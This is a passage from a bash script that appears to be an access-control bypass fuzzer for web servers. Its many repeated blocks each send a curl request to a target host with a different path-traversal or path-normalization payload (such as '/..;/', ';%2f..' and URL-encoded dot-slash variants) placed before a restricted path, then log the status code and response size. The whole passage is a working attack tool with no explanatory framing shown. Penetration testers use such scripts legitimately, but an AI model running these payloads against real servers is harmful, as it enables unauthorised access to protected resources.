echo -n "Payload [ /..//..;/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//..//..;/$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//..//..;/$PAT" -H "$user_agent")
print
echo -n "Payload [ /../;/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//../;/$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//../;/$PAT" -H "$user_agent")
print
echo -n "Payload [ /../;/../ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//../;/../$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//../;/../$PAT" -H "$user_agent")
print
echo -n "Payload [ /..;%2f ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//..;%2f$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//..;%2f$PAT" -H "$user_agent")
print
echo -n "Payload [ /..;%2f..;%2f ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//..;%2f..;%2f$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//..;%2f..;%2f$PAT" -H "$user_agent")
print
echo -n "Payload [ /..;%2f..;%2f..;%2f ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//..;%2f..;%2f..;%2f$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//..;%2f..;%2f..;%2f$PAT" -H "$user_agent")
print
echo -n "Payload [ /..;/../ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//..;/../$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//..;/../$PAT" -H "$user_agent")
print
echo -n "Payload [ /..;/..;/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//..;/..;/$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//..;/..;/$PAT" -H "$user_agent")
print
echo -n "Payload [ /..;// ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//..;//$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//..;//$PAT" -H "$user_agent")
print
echo -n "Payload [ /..;//../ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//..;//../$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//..;//../$PAT" -H "$user_agent")
print
echo -n "Payload [ /..;//..;/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//..;//..;/$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//..;//..;/$PAT" -H "$user_agent")
print
echo -n "Payload [ /..;/;/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//..;/;/$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//..;/;/$PAT" -H "$user_agent")
print
echo -n "Payload [ /..;/;/..;/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//..;/;/..;/$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//..;/;/..;/$PAT" -H "$user_agent")
print
echo -n "Payload [ /.// ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//.//$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//.//$PAT" -H "$user_agent")
print
echo -n "Payload [ /.;/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//.;/$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//.;/$PAT" -H "$user_agent")
print
echo -n "Payload [ /.;// ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//.;//$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//.;//$PAT" -H "$user_agent")
print
echo -n "Payload [ //.. ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST///..$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST///..$PAT" -H "$user_agent")
print
echo -n "Payload [ //../../ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST///../../$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST///../../$PAT" -H "$user_agent")
print
echo -n "Payload [ //..; ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST///..;$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST///..;$PAT" -H "$user_agent")
print
echo -n "Payload [ //./ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST///./$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST///./$PAT" -H "$user_agent")
print
echo -n "Payload [ //.;/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST///.;/$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST///.;/$PAT" -H "$user_agent")
print
echo -n "Payload [ ///.. ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST////..$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST////..$PAT" -H "$user_agent")
print
echo -n "Payload [ ///../ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST////../$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST////../$PAT" -H "$user_agent")
print
echo -n "Payload [ ///..// ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST////..//$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST////..//$PAT" -H "$user_agent")
print
echo -n "Payload [ ///..; ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST////..;$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST////..;$PAT" -H "$user_agent")
print
echo -n "Payload [ ///..;/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST////..;/$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST////..;/$PAT" -H "$user_agent")
print
echo -n "Payload [ ///..;// ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST////..;//$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST////..;//$PAT" -H "$user_agent")
print
echo -n "Payload [ //;/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST///;/$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST///;/$PAT" -H "$user_agent")
print
echo -n "Payload [ /;/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//;/$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//;/$PAT" -H "$user_agent")
print
echo -n "Payload [ /;// ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//;//$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//;//$PAT" -H "$user_agent")
print
echo -n "Payload [ /;x ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//;x$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//;x$PAT" -H "$user_agent")
print
echo -n "Payload [ /;x/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//;x/$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//;x/$PAT" -H "$user_agent")
print
echo -n "Payload [ /x/../ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//x/../$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//x/../$PAT" -H "$user_agent")
print
echo -n "Payload [ /x/..// ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//x/..//$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//x/..//$PAT" -H "$user_agent")
print
echo -n "Payload [ /x/../;/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//x/../;/$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//x/../;/$PAT" -H "$user_agent")
print
echo -n "Payload [ /x/..;/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//x/..;/$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//x/..;/$PAT" -H "$user_agent")
print
echo -n "Payload [ /x/..;// ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//x/..;//$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//x/..;//$PAT" -H "$user_agent")
print
echo -n "Payload [ /x/..;/;/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//x/..;/;/$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//x/..;/;/$PAT" -H "$user_agent")
print
echo -n "Payload [ /x//../ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//x//../$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//x//../$PAT" -H "$user_agent")
print
echo -n "Payload [ /x//..;/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//x//..;/$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//x//..;/$PAT" -H "$user_agent")
print
echo -n "Payload [ /x/;/../ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//x/;/../$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//x/;/../$PAT" -H "$user_agent")
print
echo -n "Payload [ /x/;/..;/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//x/;/..;/$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//x/;/..;/$PAT" -H "$user_agent")
print
echo -n "Payload [ ; ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;$PAT" -H "$user_agent")
print
echo -n "Payload [ ;%09 ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%09$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%09$PAT" -H "$user_agent")
print
echo -n "Payload [ ;%09.. ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%09..$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%09..$PAT" -H "$user_agent")
print
echo -n "Payload [ ;%09..; ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%09..;$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%09..;$PAT" -H "$user_agent")
print
echo -n "Payload [ ;%09; ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%09;$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%09;$PAT" -H "$user_agent")
print
echo -n "Payload [ ;%2F.. ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2F..$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2F..$PAT" -H "$user_agent")
print
echo -n "Payload [ ;%2f%2e%2e ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f%2e%2e$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f%2e%2e$PAT" -H "$user_agent")
print
echo -n "Payload [ ;%2f%2e%2e%2f%2e%2e%2f%2f ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f%2e%2e%2f%2e%2e%2f%2f$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f%2e%2e%2f%2e%2e%2f%2f$PAT" -H "$user_agent")
print
echo -n "Payload [ ;%2f%2f/../ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f%2f/../$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f%2f/../$PAT" -H "$user_agent")
print
echo -n "Payload [ ;%2f.. ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f..$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f..$PAT" -H "$user_agent")
print
echo -n "Payload [ ;%2f..%2f%2e%2e%2f%2f ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f..%2f%2e%2e%2f%2f$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f..%2f%2e%2e%2f%2f$PAT" -H "$user_agent")
print
echo -n "Payload [ ;%2f..%2f..%2f%2f ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f..%2f..%2f%2f$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f..%2f..%2f%2f$PAT" -H "$user_agent")
print
echo -n "Payload [ ;%2f..%2f/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f..%2f/$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f..%2f/$PAT" -H "$user_agent")
print
echo -n "Payload [ ;%2f..%2f/..%2f ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f..%2f/..%2f$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f..%2f/..%2f$PAT" -H "$user_agent")
print
echo -n "Payload [ ;%2f..%2f/../ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f..%2f/../$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f..%2f/../$PAT" -H "$user_agent")
print
echo -n "Payload [ ;%2f../%2f..%2f ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f../%2f..%2f$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f../%2f..%2f$PAT" -H "$user_agent")
print
echo -n "Payload [ ;%2f../%2f../ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f../%2f../$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f../%2f../$PAT" -H "$user_agent")
print
echo -n "Payload [ ;%2f..//..%2f ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f..//..%2f$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f..//..%2f$PAT" -H "$user_agent")
print
echo -n "Payload [ ;%2f..//../ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f..//../$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f..//../$PAT" -H "$user_agent")
print
echo -n "Payload [ ;%2f../// ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f..///$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f..///$PAT" -H "$user_agent")
print
echo -n "Payload [ ;%2f..///; ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f..///;$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f..///;$PAT" -H "$user_agent")
print
echo -n "Payload [ ;%2f..//;/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f..//;/$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f..//;/$PAT" -H "$user_agent")
print
echo -n "Payload [ ;%2f..//;/; ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f..//;/;$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f..//;/;$PAT" -H "$user_agent")
print
echo -n "Payload [ ;%2f../;// ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f../;//$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f../;//$PAT" -H "$user_agent")
print
echo -n "Payload [ ;%2f../;/;/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f../;/;/$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f../;/;/$PAT" -H "$user_agent")
print
echo -n "Payload [ ;%2f../;/;/; ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f../;/;/;$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f../;/;/;$PAT" -H "$user_agent")
print
echo -n "Payload [ ;%2f..;/// ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f..;///$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f..;///$PAT" -H "$user_agent")
print
echo -n "Payload [ ;%2f..;//;/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f..;//;/$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f..;//;/$PAT" -H "$user_agent")
print
echo -n "Payload [ ;%2f..;/;// ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f..;/;//$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f..;/;//$PAT" -H "$user_agent")
print
echo -n "Payload [ ;%2f/%2f../ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f/%2f../$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f/%2f../$PAT" -H "$user_agent")
print
echo -n "Payload [ ;%2f//..%2f ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f//..%2f$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f//..%2f$PAT" -H "$user_agent")
print
echo -n "Payload [ ;%2f//../ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f//../$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f//../$PAT" -H "$user_agent")
print
echo -n "Payload [ ;%2f//..;/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f//..;/$PAT" -H "$user_agent"
